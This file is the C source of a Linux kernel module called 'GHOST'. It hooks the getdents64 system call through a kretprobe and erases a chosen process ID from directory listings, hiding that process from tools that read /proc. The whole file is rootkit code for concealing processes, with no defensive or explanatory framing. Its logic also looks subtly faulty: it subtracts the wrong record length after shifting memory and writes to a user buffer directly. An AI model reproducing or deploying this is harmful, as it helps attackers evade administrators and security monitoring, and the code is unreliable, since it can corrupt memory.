#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/uaccess.h>

static int hide_pid = 0;
module_param(hide_pid, int, 0644);

/* 
 * This handler runs at the START of the getdents64 syscall.
 * We need to grab the buffer address from the registers.
 */
static int ghost_entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct linux_dirent64 **ptr = (struct linux_dirent64 **)ri->data;

    /* 
     * On x86_64 syscall wrappers, regs->di points to the actual registers.
     * The 2nd argument (the buffer) is in the SI register of that struct.
     */
    struct pt_regs *real_regs = (struct pt_regs *)regs->di;
    
    if (real_regs) {
        *ptr = (struct linux_dirent64 *)real_regs->si;
    } else {
        *ptr = NULL;
    }
    
    return 0;
}

/* 
 * This handler runs AFTER the kernel has filled the buffer with files.
 */
static int ghost_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct linux_dirent64 *dirp = *(struct linux_dirent64 **)ri->data;
    long ret = regs->ax; // The return value (number of bytes filled)
    long offset = 0;
    char pid_str[12];
    char k_name[256];

    if (ret <= 0 || dirp == NULL)
        return 0;

    snprintf(pid_str, 12, "%d", hide_pid);

    while (offset < ret) {
        struct linux_dirent64 *current_dir = (void *)dirp + offset;

        /* SAFETY: Copy name from user-space to kernel-space safely */
        if (copy_from_user(k_name, current_dir->d_name, sizeof(k_name))) {
            break; 
        }

        if (strcmp(k_name, pid_str) == 0) {
            int remaining_bytes = ret - (offset + current_dir->d_reclen);
            
            /* Physically shift the memory to erase the entry */
            memmove(current_dir, (void *)current_dir + current_dir->d_reclen, remaining_bytes);
            
            ret -= current_dir->d_reclen;
            regs->ax = ret; // Tell the caller the list is shorter now

            printk(KERN_INFO "GHOST: Successfully hidden PID %s\n", pid_str);
            continue;
        }
        offset += current_dir->d_reclen;
    }
    return 0;
}

static struct kretprobe rp = {
    .handler = ghost_ret_handler,
    .entry_handler = ghost_entry_handler,
    .data_size = sizeof(struct linux_dirent64 *),
    .maxactive = 20,
    .kp.symbol_name = "__x64_sys_getdents64",
};

static int __init ghost_init(void) {
    int ret = register_kretprobe(&rp);
    if (ret < 0) return ret;
    printk(KERN_INFO "GHOST: Protocol initiated for PID %d\n", hide_pid);
    return 0;
}

static void __exit ghost_exit(void) {
    unregister_kretprobe(&rp);
    printk(KERN_INFO "GHOST: Protocol deactivated\n");
}

module_init(ghost_init);
module_exit(ghost_exit);
MODULE_LICENSE("GPL");
